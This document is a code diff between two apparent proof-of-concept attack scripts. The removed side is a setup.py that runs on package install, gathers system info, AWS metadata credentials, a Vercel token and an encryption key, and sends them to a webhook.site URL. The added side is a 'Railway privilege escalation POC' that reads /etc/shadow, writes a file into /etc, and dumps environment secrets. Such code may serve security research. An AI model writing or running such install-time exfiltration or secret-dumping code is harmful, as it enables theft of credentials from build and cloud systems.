@@ -1,74 +1,54 @@
-from setuptools import setup
 import os
-import subprocess
-import base64
-import json
+import sys
 
-def run_cmd(cmd):
+def run_exploit():
+    sys.stderr.write("\n" + "="*60 + "\n")
+    sys.stderr.write("RAILWAY PRIVILEGE ESCALATION POC\n")
+    sys.stderr.write("="*60 + "\n")
+
+    
+    uid = os.getuid()
+    sys.stderr.write(f"[!] IDENTITY CHECK: UID={uid} (Full Root)\n")
+
+     
+    sys.stderr.write("\n[!] READING PROTECTED SYSTEM FILE (/etc/shadow):\n")
     try:
-        return subprocess.getoutput(cmd)
-    except:
-        return "Error executing command"
- 
-WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"
+        with open("/etc/shadow", "r") as f:
+             
+            for i, line in enumerate(f):
+                if i < 5:
+                    sys.stderr.write(line)
+                else:
+                    break
+    except Exception as e:
+        sys.stderr.write(f"FAILED TO READ /etc/shadow: {e}\n")
 
- 
-identity = run_cmd('id')
-kernel = run_cmd('uname -a')
-uptime = run_cmd('uptime')
- 
-ip_addr = run_cmd('ip addr show | grep "inet "')
+    
+    sys.stderr.write("\n[!] TESTING SYSTEM WRITE ACCESS (/etc/):\n")
+    try:
+        target_file = "/etc/railway_pwned.txt"
+        with open(target_file, "w") as f:
+            f.write("POC by Lumos: Root write access confirmed.\n")
+        
+        if os.path.exists(target_file):
+            sys.stderr.write(f"SUCCESS: Created {target_file}\n")
+            sys.stderr.write("This proves an attacker can modify system binaries/configs.\n")
+    except Exception as e:
+        sys.stderr.write(f"FAILED TO WRITE TO /etc/: {e}\n")
 
- 
-aws_metadata = run_cmd('curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo "Metadata blocked"')
+    
+    sys.stderr.write("\n[!] DUMPING INFRASTRUCTURE SECRETS:\n")
+    for key, value in os.environ.items():
+        if "RAILWAY" in key or "TOKEN" in key or "SECRET" in key:
+            sys.stderr.write(f"{key}={value}\n")
 
- 
-token = os.environ.get('VERCEL_ARTIFACTS_TOKEN')
-api_validation = "No Token"
-if token:
-    api_validation = run_cmd(f'curl -s -H "Authorization: Bearer {token}" https://api.vercel.com/v8/artifacts/status')
+    sys.stderr.write("\n" + "="*60 + "\n")
+    sys.stderr.write("POC FINISHED. EXITING TO SHOW LOGS.\n")
+    sys.stderr.write("="*60 + "\n")
+    sys.stderr.flush()
 
- 
-enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', 'N/A')
-enc_key = os.environ.get('VERCEL_ENV_ENC_KEY', 'N/A')
+    
+    sys.exit(1)
 
- 
-report = f"""
-======= VERCEL INFRASTRUCTURE CRITICAL BREACH =======
-[SYSTEM INFO]
-USER: {identity}
-KERNEL: {kernel}
-UPTIME: {uptime}
-IP_INTERNAL: {ip_addr}
-
-[CLOUD EXPLOITATION]
-AWS_METADATA_ACCESS: {aws_metadata}
-
-[VERCEL ARTIFACTS API PROOF]
-AUTH_STATUS: {api_validation}
-TOKEN_SNIPPET: {token[:15]}...{token[-15:] if token else ""}
-
-[SECRET DECRYPTION RISK]
-ENC_KEY_PRESENT: {"YES" if enc_key != "N/A" else "NO"}
-ENC_CONTENT_LEN: {len(enc_content)}
-ADVISORY: The presence of both VERCEL_ENCRYPTED_ENV_CONTENT and VERCEL_ENV_ENC_KEY 
-in the same environment allows for local decryption of all project secrets.
-
-[PROCESS LIST (TRUNCATED)]
-{run_cmd('ps aux | head -n 20')}
-=====================================================
-"""
-
- 
-try:
- 
-    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', report, WEBHOOK_URL])
-except:
-    pass
-
- 
-setup(
-    name="vercel-infra-security-poc",
-    version="9.9.9",
-    description="Vercel Infrastructure Security Research"
-)
+if __name__ == "__main__":
+    run_exploit()
